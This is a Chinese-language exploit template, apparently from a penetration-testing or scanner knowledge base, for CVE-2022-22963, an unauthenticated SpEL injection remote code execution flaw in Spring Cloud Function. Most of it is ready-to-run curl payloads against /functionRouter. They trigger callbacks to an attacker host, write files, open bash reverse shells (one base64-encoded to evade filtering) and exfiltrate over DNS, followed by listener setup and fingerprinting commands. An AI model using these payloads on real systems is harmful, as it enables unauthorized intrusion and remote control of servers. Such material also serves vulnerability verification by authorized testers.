---
id: SPRING-CLOUD-FUNCTION-SPEL
title: Spring Cloud Function SpEL 远程命令执行漏洞 (CVE-2022-22963)
product: spring-cloud
vendor: Spring
version_affected: "Spring Cloud Function <= 3.1.6, <= 3.2.2"
severity: CRITICAL
tags: [rce, el_injection, 无需认证]
fingerprint: ["Spring", "Spring Cloud Function"]
---

## 漏洞描述

Spring Cloud Function 3.1.6、3.2.2 及更早版本中，`spring.cloud.function.routing-expression` HTTP 请求头的值会被直接作为 SpEL（Spring Expression Language）表达式执行。攻击者无需认证，只需向 `/functionRouter` 端点发送包含恶意 SpEL 表达式的请求头，即可在服务器上执行任意命令，实现远程代码执行。

## 影响版本

- Spring Cloud Function <= 3.1.6
- Spring Cloud Function <= 3.2.2

## 前置条件

- 无需认证
- 目标应用使用了 Spring Cloud Function 并暴露 `/functionRouter` 端点
- HTTP 端口可达（默认 8080）

## 利用步骤

1. 确认目标是否为 Spring 应用（响应头、错误页面特征）
2. 向 `/functionRouter` 发送 POST 请求，在 `spring.cloud.function.routing-expression` 头中注入 SpEL 表达式
3. 通过 HTTP 回调或命令输出确认 RCE
4. 根据需要执行进一步命令或反弹 shell

## Payload

```bash
# HTTP 回调验证 RCE
curl -X POST "http://target:8080/functionRouter" \
  -H "spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec('curl http://ATTACKER_IP/callback')" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "test"

# 写文件到 /tmp 验证（可通过后续漏洞链读取）
curl -X POST "http://target:8080/functionRouter" \
  -H "spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec('touch /tmp/pwned')" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "test"

# 反弹 shell（直接方式）
curl -X POST "http://target:8080/functionRouter" \
  -H "spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(new String[]{'/bin/bash','-c','bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'})" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "test"

# 反弹 shell（base64 编码绕过特殊字符）
# 先将 bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1 进行 base64 编码
curl -X POST "http://target:8080/functionRouter" \
  -H "spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(new String[]{'/bin/bash','-c','{echo,BASE64_ENCODED_PAYLOAD}|{base64,-d}|bash'})" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "test"

# DNS 外带验证
curl -X POST "http://target:8080/functionRouter" \
  -H "spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec('curl http://ATTACKER_DOMAIN')" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "test"
```

## 验证方法

```bash
# 方法1: HTTP 回调（OOB 侧监听）
python3 -m http.server 80
# 发送带 POC_TOKEN 的回调 payload
curl -X POST "http://target:8080/functionRouter" \
  -H "spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec('curl http://OOB_DOMAIN/POC_TOKEN')" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "test"
# 判据：监听端收到目标源 IP 发起的请求，且请求路径/查询里带着本次的 POC_TOKEN
# 反例：只有一般性的扫描请求、路径里没有 POC_TOKEN，不算命中

# 方法2: DNS 外带
curl -X POST "http://target:8080/functionRouter" \
  -H "spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec('nslookup POC_TOKEN.OOB_DOMAIN')" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "test"
# 判据：OOB_DOMAIN 的解析记录里出现本次随机子域（POC_TOKEN），说明表达式已执行

# 方法3: 反弹 shell（有回连即命中）
nc -lvp ATTACKER_PORT
# 判据：监听端收到来自目标源 IP 的连接
```

## 指纹确认

```bash
# 检查是否为 Spring 应用
curl -s -I http://target:8080/ | grep -iE "X-Application-Context|Server" | grep -i "spring"

# 检查 /functionRouter 端点是否存在
curl -s -o /dev/null -w "%{http_code}" -X POST http://target:8080/functionRouter -d "test"
# 返回 404 以外的状态码说明端点存在
```

## 参考链接

- https://nvd.nist.gov/vuln/detail/CVE-2022-22963
- https://spring.io/security/cve-2022-22963
- https://github.com/spring-cloud/spring-cloud-function/commit/0e89ee27b2e76138c16bcba6f4bca906c4f3744f
